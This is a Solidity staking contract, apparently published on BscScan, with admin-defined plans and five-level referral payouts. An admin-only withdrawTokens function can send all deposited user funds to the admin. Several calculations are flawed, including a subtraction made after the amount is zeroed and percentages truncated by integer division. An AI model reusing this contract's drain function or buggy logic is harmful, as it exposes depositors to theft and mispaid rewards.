/**
 *Submitted for verification at BscScan.com on 2022-08-26
*/

/**
 *Submitted for verification at BscScan.com on 2022-08-23
*/

/**
 *Submitted for verification at BscScan.com on 2022-08-18
*/

/**
 *Submitted for verification at BscScan.com on 2022-07-14
*/

pragma solidity 0.5.10;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


contract LevelStakes {
	using SafeMath for uint256;
    IERC20 public token = IERC20(0xBf4B5f6c4B23A9d5adf9B81C23986d4bAb465C07); //** test token
		
	uint256[] public SEED_PERCENTS 		= [1000, 500, 300, 200, 100];
	uint256 constant public REFFERAL_FEE = 5000;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public PLANPER_DIVIDER = 10000;
	uint256 constant public TIME_STEP = 1 days;
    address [] private admins;
	uint256 public totalInvested;

	address chkLv2;
    address chkLv3;
    address chkLv4;
    address chkLv5;    

	
    
    struct RefUserDetail {
        address refUserAddress;
        uint256 refLevel;
    }

    mapping(address => mapping (uint => RefUserDetail)) public RefUser;
    mapping(address => uint256) public referralCount_;
    
	
	mapping(address => address) internal referralLevel1Address;
    mapping(address => address) internal referralLevel2Address;
    mapping(address => address) internal referralLevel3Address;
    mapping(address => address) internal referralLevel4Address;
    mapping(address => address) internal referralLevel5Address;
	

    struct planInformation {
        uint256[] time;
        uint256[] percent;
        uint256[] minAmount;
        uint256[] planName;
    }


    mapping(uint256 => planInformation) internal  planInfo;

    struct plan{
      uint256 planId;
      string planName;
	  bool active;
    }
    mapping (uint256 => plan) public plans;

    uint256 public planId=0;	


	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;		
		uint256 seedincome;
		bool isWithdraw;
		uint256 planDetailId;
		uint256 withdrawRewardTokens;
		uint256 withdrawnseed;
	}
	uint256 internal levelsLimit=5;

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[5] levels;
		uint256 withdrawn;		
	}

	mapping (address => User) internal users;

	// bool public started=true;
	address public admin;
	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);	
	event SeedIncome(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	
	constructor(address payable wallet) public {
		require(!isContract(wallet));
		admin=wallet;
		admins.push(wallet);
	}
	
	modifier onlyAdmin(){
		require(msg.sender==admin,"Error: You Are Not Admin");
		_;
	}

    function insertPlan(string memory _planName) public onlyAdmin {
      planId++;	  
      plans[planId].planId=planId;
      plans[planId].planName=_planName;
      plans[planId].active=true;
    }


  function addPlanData(uint256 _plan,uint256 _time,uint256 _percentage,uint256 _minAmount) public onlyAdmin{
	require(_plan>0,"Invalid plan value");
    require(planId>=_plan,"Plan is not added yet");
    planInformation storage planDetails = planInfo[_plan];
    planDetails.time.push(_time);
    planDetails.percent.push(_percentage);
    planDetails.minAmount.push(_minAmount);
    planDetails.planName.push(_plan);
  }

  function getPlanInfo(uint256 _plan) public view returns (uint256[] memory time,uint256[] memory percent,uint256[] memory minAmount,uint256[] memory planName){
    require(keccak256(bytes(plans[_plan].planName)) != keccak256(bytes("")),"Plan not Found");
	planInformation storage planDetails = planInfo[_plan];
	time = planDetails.time;
	percent = planDetails.percent;
	minAmount = planDetails.minAmount;
	planName = planDetails.planName;

  }


  function updatePlanStatus(uint256 _planId,bool _active) public onlyAdmin {
    require(_planId>0,"Plan Not Found");
	 plans[_planId].active=_active;
  }	

	function getDownlineRef(address senderAddress, uint dataId) public view returns (address,uint) { 
        return (RefUser[senderAddress][dataId].refUserAddress,RefUser[senderAddress][dataId].refLevel);
    }
    
    function addDownlineRef(address senderAddress, address refUserAddress, uint refLevel) internal {
        referralCount_[senderAddress]++;
        uint dataId = referralCount_[senderAddress];
        RefUser[senderAddress][dataId].refUserAddress = refUserAddress;
        RefUser[senderAddress][dataId].refLevel = refLevel;
    }

	function addadmins(address _address) public onlyAdmin {
		require(!checkExitsAddress(_address),"Address already added");
		admins.push(_address);
	}
    
	function fetchAdmins() public view returns(address [] memory){
		return admins;
	}
	
	function transferOwnership( address  _newAdmin) public onlyAdmin{
		admin=_newAdmin;
	}

	function checkExitsAddress(address _userAdd) private view returns (bool){
       bool found=false;
        for (uint i=0; i<admins.length; i++) {
            if(admins[i]==_userAdd){
                found=true;
                break;
            }
        }
        return found;
    }
	
	 function distributeRef(address _referredBy,address _sender, bool _newReferral) internal {
       
          address _customerAddress        = _sender;
        // Level 1
        referralLevel1Address[_customerAddress]                     = _referredBy;
        if(_newReferral == true) {
            addDownlineRef(_referredBy, _customerAddress, 1);
        }
        
        chkLv2                          = referralLevel1Address[_referredBy];
        chkLv3                          = referralLevel2Address[_referredBy];
        chkLv4                          = referralLevel3Address[_referredBy];
        chkLv5                          = referralLevel4Address[_referredBy];
		
		
        // Level 2
        if(chkLv2 != 0x0000000000000000000000000000000000000000) {
            referralLevel2Address[_customerAddress]                     = referralLevel1Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel1Address[_referredBy], _customerAddress, 2);
            }
        }
        
        // Level 3
        if(chkLv3 != 0x0000000000000000000000000000000000000000) {
            referralLevel3Address[_customerAddress]                     = referralLevel2Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel2Address[_referredBy], _customerAddress, 3);
            }
        }
        

        // Level 4
        if(chkLv4 != 0x0000000000000000000000000000000000000000) {
            referralLevel4Address[_customerAddress]                     = referralLevel3Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel3Address[_referredBy], _customerAddress, 4);
            }
        }
        
        // Level 5
        if(chkLv5 != 0x0000000000000000000000000000000000000000) {
            referralLevel5Address[_customerAddress]                     = referralLevel4Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel4Address[_referredBy], _customerAddress, 5);
            }
        }        		
       
    }


	function invest(address referrer, uint8 _plan,uint8 planDetailId, uint256 amounts) public  {
		require(plans[_plan].active==true,"Plan is not activated");
	
		planInformation storage planDetails = planInfo[_plan];
		require(amounts >= planDetails.minAmount[planDetailId],"Amount must be greater then minimum amount");
        require(keccak256(bytes(plans[_plan].planName)) != keccak256(bytes("")),"Plan is not Found");
        token.transferFrom(msg.sender, address(this), amounts);

        if(referrer != msg.sender && referrer != address(0)){
            uint256 percent = REFFERAL_FEE.div(PERCENTS_DIVIDER);
            uint256 fee = amounts.mul(percent).div(100);
            token.transfer(referrer,fee);
		    emit FeePayed(msg.sender, fee);
        }
		

		User storage user = users[msg.sender];

		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < levelsLimit-1; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
			
		}
		 bool    _newReferral                = true;
        if(referralLevel1Address[msg.sender] != 0x0000000000000000000000000000000000000000) {
            referrer                     = referralLevel1Address[msg.sender];
            _newReferral                    = false;
        }
		
		distributeRef(referrer, msg.sender, _newReferral);

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;


			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(_plan, amounts,  block.timestamp, 0,false,planDetailId,0,0));

		totalInvested = totalInvested.add(amounts);

		emit NewDeposit(msg.sender, _plan, amounts);
	}


	function withdraw(uint256 index) public {
		
		User storage user = users[msg.sender];
		require(user.deposits.length>index,"Invalid withdraw request!");				
		require(user.deposits[index].amount>0,"You are not eligible for withdraw reward!");
		uint256 totalAmount = getUserDividends(msg.sender,index);
		uint256 totalRewardAmount = getUserDividends(msg.sender,index);
		uint256 seedAmount = getcurrentseedincome(msg.sender,index);

		totalAmount = totalAmount.add(seedAmount);
		user.deposits[index].withdrawnseed = user.deposits[index].withdrawnseed.add(seedAmount);
		
		require(totalAmount > 0, "User has no dividends");

		planInformation storage planDetails = planInfo[user.deposits[index].plan];
        if(planDetails.time[user.deposits[index].planDetailId]+user.deposits[index].start<block.timestamp){
            token.transfer(msg.sender,user.deposits[index].amount);
            user.deposits[index].amount = 0;
            user.deposits[index].isWithdraw = true;
            totalInvested = totalInvested.sub(user.deposits[index].amount);
        } 
        user.deposits[index].withdrawRewardTokens += totalRewardAmount;
		user.checkpoint = block.timestamp;
		user.withdrawn = user.withdrawn.add(totalAmount);
        token.transfer(msg.sender,totalAmount);
		emit Withdrawn(msg.sender, totalAmount);
	}
	

	function getContractBalance() public view returns (uint256) {
		return token.balanceOf(address(this));
	}
	
    function withdrawTokens() public onlyAdmin{              
        token.transfer(admin,token.balanceOf(address(this)));                 
    }


	function getUserDividends(address userAddress,uint256 index) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;
		planInformation storage planDetails = planInfo[user.deposits[index].plan];
		uint256 finish = user.deposits[index].start.add(planDetails.time[user.deposits[index].planDetailId].mul(1 days));
		if(user.deposits[index].amount>0){
			if (user.checkpoint < finish) {

				uint256 currentTime = block.timestamp;
				uint256 APY = (planDetails.percent[user.deposits[index].planDetailId]).div(PLANPER_DIVIDER);
				uint256 tps = (APY.mul(1e18)).div(100 * 86400 * 365);
				uint256 reward = (currentTime.sub(user.deposits[index].start)).mul(tps);
				uint256 totalReardAmount = (user.deposits[index].amount).mul(reward).div(1e18);
				// uint256 share = user.deposits[index].amount.mul(planDetails.percent[user.deposits[index].planDetailId]).div(PLANPER_DIVIDER);
				uint256 from = user.deposits[index].start > user.checkpoint ? user.deposits[index].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(totalReardAmount).sub(user.deposits[index].withdrawRewardTokens);					
				}
			}
		}
		return totalAmount;
	}
	
	function getUserSeedIncome(address userAddress,uint256 index) public view returns (uint256){
		uint256 seedshare;

		uint256 count = getUserTotalReferrals(userAddress);
		User storage userdetails = users[userAddress];
		uint256 totalSeedAmount;
		if(userdetails.deposits[index].amount>0){
			for	(uint256 y=1; y<= count; y++)
			{
				uint256 level;
				address addressdownline;
				
				(addressdownline,level) = getDownlineRef(userAddress, y);
			
					User storage downline = users[addressdownline];
					if(downline.deposits.length>0){
						for(uint256 i=0;i<downline.deposits.length;i++){

							planInformation storage planDetails = planInfo[downline.deposits[i].plan];
							uint256 planDetailIds = downline.deposits[i].planDetailId;
							uint256 finish = downline.deposits[i].start.add(planDetails.time[planDetailIds].mul(1 days));

							if (downline.deposits[i].start < finish) {
								uint256 share = calculateDownlineRewards(addressdownline,i);
								uint256 from = downline.deposits[i].start;
								uint256 to = finish < block.timestamp ? finish : block.timestamp;						
								uint percentage = (SEED_PERCENTS[level-1]).div(PERCENTS_DIVIDER);
								seedshare = share.mul(percentage).div(100);
								
								if (from < to) {							
									totalSeedAmount += seedshare;						
								}
							}
						} 
					}					
			}
			if(totalSeedAmount>userdetails.deposits[index].withdrawnseed){
				totalSeedAmount = totalSeedAmount.sub(userdetails.deposits[index].withdrawnseed);		
			}
		}

		return totalSeedAmount;			
	}
	
	function calculateDownlineRewards(address userAddress,uint256 index) public view returns(uint256){
		User storage downline = users[userAddress];
		planInformation storage planDetails = planInfo[downline.deposits[index].plan];
		uint256 currentTime = block.timestamp;
		uint256 APY = (planDetails.percent[downline.deposits[index].planDetailId]).div(PLANPER_DIVIDER);
		uint256 tps = (APY.mul(1e18)).div(100 * 86400 * 365);
		uint256 reward = (currentTime.sub(downline.deposits[index].start)).mul(tps);
		uint256 totalReardAmount = (downline.deposits[index].amount).mul(reward).div(1e18);
		return totalReardAmount;
	}
	
	function getcurrentseedincome(address userAddress,uint256 index) public view returns (uint256){
	    return getUserSeedIncome(userAddress,index);	    
	}
	
	function getUserTotalSeedWithdrawn(address userAddress,uint256 index) public view returns (uint256) {
		return users[userAddress].deposits[index].withdrawnseed;
	}


	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[5] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2]+users[userAddress].levels[3]+users[userAddress].levels[4];
	}


	function getUserAvailable(address userAddress,uint256 index) public view returns(uint256) {
		return getUserDividends(userAddress,index);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 _plan,uint256 planDetailId, uint256 percent, uint256 amount, bool isWithdraw,uint256 withdrawRewardTokens,uint256 start, uint256 finish) {
	    User storage user = users[userAddress];
		planInformation storage planDetails = planInfo[user.deposits[index].plan];
		_plan = user.deposits[index].plan;
	    planDetailId = user.deposits[index].planDetailId;
		percent = planDetails.percent[user.deposits[index].planDetailId];
		amount = user.deposits[index].amount;
		isWithdraw = user.deposits[index].isWithdraw;
		withdrawRewardTokens = user.deposits[index].withdrawRewardTokens;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(planDetails.time[user.deposits[index].planDetailId].mul(1 days));
	}

	function getSiteInfo() public view returns(uint256 _totalInvested) {
		return(totalInvested);
	}

	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}